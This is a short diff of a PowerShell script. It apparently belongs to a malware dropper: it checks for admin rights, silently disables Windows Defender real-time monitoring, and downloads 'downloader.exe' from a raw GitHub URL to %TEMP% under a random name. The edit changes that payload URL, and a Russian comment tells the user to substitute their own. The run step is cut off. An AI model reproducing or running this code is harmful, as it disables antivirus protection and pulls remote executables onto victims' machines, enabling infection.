@@ -11,7 +11,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
 
 
-$Url = "https://raw.githubusercontent.com/theteslabro/inastaller/main/downloader.exe" # Замени на свой сырой URL с GitHub
+$Url = "https://raw.githubusercontent.com/theteslabro/223423/main/downloader.exe" # Замени на свой сырой URL с GitHub
 
 $RandomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_}) + ".exe"
 $Output = "$env:TEMP\$RandomName"
